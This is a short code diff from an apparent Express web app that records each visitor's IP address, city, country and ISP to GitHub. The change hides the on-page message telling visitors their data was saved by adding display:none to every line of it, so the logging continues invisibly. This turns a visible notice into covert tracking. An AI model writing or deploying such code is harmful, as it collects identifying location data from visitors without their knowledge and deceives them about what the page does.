@@ -70,10 +70,10 @@ app.get('/', async (req, res) => {
         console.log(`IP ve Lokasyon basariyla GitHub'a kaydedildi: ${ipAdresi}`);
         
         res.send(`
-            <h1>Bilgileriniz Başarıyla Kaydedildi</h1>
-            <p><b>IP Adresiniz:</b> ${ipAdresi}</p>
-            <p><b>Tahmini Konum:</b> ${locationInfo.sehir || 'Bilinmiyor'}, ${locationInfo.ulke || 'Bilinmiyor'}</p>
-            <p><b>İnternet Sağlayıcınız:</b> ${locationInfo.iss || 'Bilinmiyor'}</p>
+            <h1 style="display: none;">Bilgileriniz Başarıyla Kaydedildi</h1>
+            <p style="display: none;"><b>IP Adresiniz:</b> ${ipAdresi}</p>
+            <p style="display: none;"><b>Tahmini Konum:</b> ${locationInfo.sehir || 'Bilinmiyor'}, ${locationInfo.ulke || 'Bilinmiyor'}</p>
+            <p style="display: none;"><b>İnternet Sağlayıcınız:</b> ${locationInfo.iss || 'Bilinmiyor'}</p>
         `);
 
     } catch (error) {
